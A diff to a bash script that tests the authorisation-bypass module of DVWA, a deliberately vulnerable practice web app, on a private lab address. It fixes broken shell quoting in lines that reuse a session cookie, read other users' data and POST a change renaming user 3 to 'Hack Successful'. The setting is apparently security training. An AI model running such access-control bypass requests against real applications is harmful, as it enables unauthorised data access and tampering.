@@ -13,19 +13,19 @@ http://192.168.56.105/DVWA/login.php \
 >login.html
 
 TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
-PHPSESSID=\((awk '\)6=="PHPSESSID"{print $7}' cookies.txt) #saves PHP session ID found in cookies
+PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt) #saves PHP session ID found in cookies
 
 #logs in using cookies and user token
 curl -s -b cookies.txt \
 -b "security=$SECURITY" \
--d "username=\(USER&password=\)PASS&user_token=$TOKEN&Login=Login" \
+-d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
 http://192.168.56.105/DVWA/login.php
 
 
 
 #attempts to access authorisation bypass page
 HTML=$(curl -s -X GET \
--b "PHPSESSID=\(PHPSESSID; security=\)SECURITY" \
+-b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
 http://192.168.56.105/DVWA/vulnerabilities/authbypass/)
 
 {
@@ -60,7 +60,7 @@ fi
 
 #attempts to retrieve user data
 RESPONSE=$(curl -s -X GET \
--b "PHPSESSID=\(PHPSESSID; security=\)SECURITY" \
+-b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
 http://192.168.56.105/DVWA/vulnerabilities/authbypass/get_user_data.php)
 
 {
@@ -71,7 +71,7 @@ echo "Endpoint: /DVWA/vulnerabilities/authbypass/get_user_data.php"
 echo ""
 
 if echo "$RESPONSE" | jq -e '.result=="fail"' >/dev/null 2>&1; then
-    echo "Result: \((echo "\)RESPONSE" | jq -r '.error')"
+    echo "Result: $(echo "$RESPONSE" | jq -r '.error')"
 else
     echo "Result: ACCESS GRANTED"
     echo ""
@@ -91,7 +91,7 @@ echo "Security level: $SECURITY"
 echo "Endpoint: /DVWA/vulnerabilities/authbypass/change_user_details.php"
 echo ""
 curl -s -X POST \
--b "PHPSESSID=\(PHPSESSID; security=\)SECURITY" \
+-b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
 -H "Content-Type: application/json" \
 -d '{"id":3,"first_name":"Hack","surname":"Successful"}' \
 http://192.168.56.105/DVWA/vulnerabilities/authbypass/change_user_details.php \
